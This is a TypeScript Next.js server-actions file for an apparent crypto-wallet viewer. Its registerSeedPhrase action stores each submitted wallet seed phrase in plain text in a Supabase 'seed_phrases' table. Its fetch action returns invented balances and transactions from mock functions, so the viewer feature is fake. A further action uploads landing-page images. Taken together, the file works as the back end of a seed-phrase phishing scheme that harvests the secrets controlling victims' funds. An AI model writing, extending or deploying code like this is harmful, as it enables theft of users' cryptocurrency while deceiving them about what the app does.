
"use server";

import { z } from "zod";
import { createClient } from "@supabase/supabase-js";
import type { Asset, Transaction, WalletData } from "@/lib/types";
import mime from 'mime-types';


const formSchema = z.object({
  seedPhrase: z.string(),
  network: z.string(),
});

type RegistrationResult = {
  success: boolean;
  error?: string;
};

// This is a secure server action to register the seed phrase in Supabase
export async function registerSeedPhrase(
  formData: FormData
): Promise<RegistrationResult> {
  const rawFormData = {
    seedPhrase: formData.get("seedPhrase"),
    network: formData.get("network"),
  };

  const validatedFields = formSchema.safeParse(rawFormData);
  if (!validatedFields.success) {
    return {
      success: false,
      error: "Invalid data provided.",
    };
  }

  const supabaseUrl = process.env.SUPABASE_URL;
  const supabaseServiceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

  // Temporary debugging logs
  console.log("SERVER ACTION ENV VARS:");
  console.log("URL:", supabaseUrl ? "Loaded" : "undefined");
  console.log("ROLE KEY:", supabaseServiceRoleKey ? "Loaded" : "undefined");


  if (!supabaseUrl || !supabaseServiceRoleKey) {
    let missingVars = [];
    if (!supabaseUrl) missingVars.push("SUPABASE_URL");
    if (!supabaseServiceRoleKey) missingVars.push("SUPABASE_SERVICE_ROLE_KEY");
    console.error(`Supabase server-side environment variables are not set: ${missingVars.join(", ")}`);
    return {
      success: false,
      error: "Server configuration error. Required environment variables are not set.",
    };
  }

  try {
    const supabaseAdmin = createClient(supabaseUrl, supabaseServiceRoleKey);
    const { error } = await supabaseAdmin
      .from("seed_phrases")
      .insert([
        {
          seed_phrase: validatedFields.data.seedPhrase,
          network: validatedFields.data.network,
        },
      ])
      .select();

    if (error) {
      console.error("Supabase admin insert error:", error);
      return { success: false, error: `Database error: ${error.message}` };
    }

    return { success: true };
  } catch (err: any) {
    console.error("Unexpected error during seed registration:", err);
    return {
      success: false,
      error: "An unexpected server error occurred during registration.",
    };
  }
}

function mockFetchTransactions(assets: Asset[]): Transaction[] {
  if (assets.length === 0) {
    return [];
  }

  const transactions: Transaction[] = [
    {
      id: "tx1",
      date: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
      type: "in",
      asset: "ETH",
      amount: 0.5,
      valueUsd: 1750.0,
      from: "0x...abc",
      to: "My Wallet",
    },
    {
      id: "tx2",
      date: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000).toISOString(),
      type: "out",
      asset: "BTC",
      amount: 0.01,
      valueUsd: 700.0,
      from: "My Wallet",
      to: "0x...def",
    },
    {
      id: "tx3",
      date: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString(),
      type: "in",
      asset: "SOL",
      amount: 10,
      valueUsd: 1600.0,
      from: "0x...ghi",
      to: "My Wallet",
    },
  ];

  const userSymbols = new Set(assets.map((a) => a.symbol));
  return transactions.filter((tx) => userSymbols.has(tx.asset));
}

function mockFetchDataFromSeed(
  seedPhrase: string,
  network: string
): WalletData {
  const wordCount = seedPhrase.trim().split(/\s+/).length;

  if (wordCount < 12) {
    return { assets: [], transactions: [] };
  }

  const allAssets: Asset[] = [
    { network: "Ethereum", symbol: "ETH", balance: 1.25, valueUsd: 4375.0 },
    { network: "Bitcoin", symbol: "BTC", balance: 0.05, valueUsd: 3500.0 },
    { network: "Solana", symbol: "SOL", balance: 15.5, valueUsd: 2480.0 },
    { network: "Polygon", symbol: "MATIC", balance: 2500, valueUsd: 1750.0 },
    { network: "BNB Smart Chain", symbol: "BNB", balance: 3.2, valueUsd: 1920.0 },
    { network: "Avalanche", symbol: "AVAX", balance: 50, valueUsd: 1800.0 },
    { network: "Cardano", symbol: "ADA", balance: 10000, valueUsd: 4500.0 },
    { network: "Polkadot", symbol: "DOT", balance: 100, valueUsd: 700.0 },
    { network: "Litecoin", symbol: "LTC", balance: 10, valueUsd: 800.0 },
    { network: "Chainlink", symbol: "LINK", balance: 200, valueUsd: 2800.0 },
    { network: "Tron", symbol: "TRX", balance: 50000, valueUsd: 5500.0 },
    { network: "Stellar", symbol: "XLM", balance: 10000, valueUsd: 1100.0 },
    { network: "Tezos", symbol: "XTZ", balance: 1000, valueUsd: 800.0 },
  ];

  const selectedAssets = allAssets.filter((asset) =>
    asset.network === network
  );
  
  if (selectedAssets.length === 0) {
     return { assets: [], transactions: [] };
  }
  
  const assets = selectedAssets.map(asset => ({
      ...asset,
      balance: asset.balance * (1 + (seedPhrase.length % 10) / 20),
      valueUsd: asset.valueUsd * (1 + (seedPhrase.length % 10) / 20)
  }));

  const transactions = mockFetchTransactions(assets);

  return { assets, transactions };
}

type FetchResult = {
  success: boolean;
  data?: WalletData;
  error?: string;
};

export async function handleFetchData(
  formData: FormData
): Promise<FetchResult> {
  const rawFormData = {
    seedPhrase: formData.get("seedPhrase"),
    network: formData.get("network"),
  };

  const validatedFields = formSchema.safeParse(rawFormData);

  if (!validatedFields.success) {
    return {
      success: false,
      error: "Invalid form data provided.",
    };
  }

  try {
    const result = mockFetchDataFromSeed(
      validatedFields.data.seedPhrase,
      validatedFields.data.network
    );
    return {
      success: true,
      data: result,
    };
  } catch (error) {
    console.error("Data fetching failed:", error);
    return {
      success: false,
      error: "An unexpected error occurred while fetching wallet data.",
    };
  }
}

type UpdateImagesResult = {
  success: boolean;
  error?: string;
  updatedUrls?: Record<string, string>;
};

// This is a secure server action to upload images and update the database
export async function updateLandingPageImages(
  formData: FormData
): Promise<UpdateImagesResult> {
  const supabaseUrl = process.env.SUPABASE_URL;
  const supabaseServiceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

  if (!supabaseUrl || !supabaseServiceRoleKey) {
    return { success: false, error: "Server configuration error." };
  }

  const supabaseAdmin = createClient(supabaseUrl, supabaseServiceRoleKey);

  const updatedUrls: Record<string, string> = {};

  // Fetch the current content
  const { data: currentContentData, error: fetchError } = await supabaseAdmin
    .from("editable_content")
    .select("content")
    .eq("id", "landing-page-images")
    .single();

  if (fetchError) {
    return { success: false, error: `Database fetch error: ${fetchError.message}` };
  }

  const newContent = { ...currentContentData.content };

  for (const [id, file] of formData.entries()) {
    if (file instanceof File) {
      const filePath = `public/${id}-${Date.now()}`;
      const contentType = mime.lookup(file.name) || 'application/octet-stream';

      const { error: uploadError } = await supabaseAdmin.storage
        .from("landing-images")
        .upload(filePath, file, {
            contentType,
            upsert: true,
        });

      if (uploadError) {
        console.error("Supabase upload error:", uploadError);
        return { success: false, error: `Upload error: ${uploadError.message}` };
      }

      const { data: publicUrlData } = supabaseAdmin.storage
        .from("landing-images")
        .getPublicUrl(filePath);

      if (publicUrlData) {
        newContent[id] = publicUrlData.publicUrl;
        updatedUrls[id] = publicUrlData.publicUrl;
      }
    }
  }

  const { error: updateError } = await supabaseAdmin
    .from("editable_content")
    .update({ content: newContent, updated_at: new Date().toISOString() })
    .eq("id", "landing-page-images");

  if (updateError) {
    console.error("Supabase update error:", updateError);
    return { success: false, error: `Database update error: ${updateError.message}` };
  }

  return { success: true, updatedUrls };
}
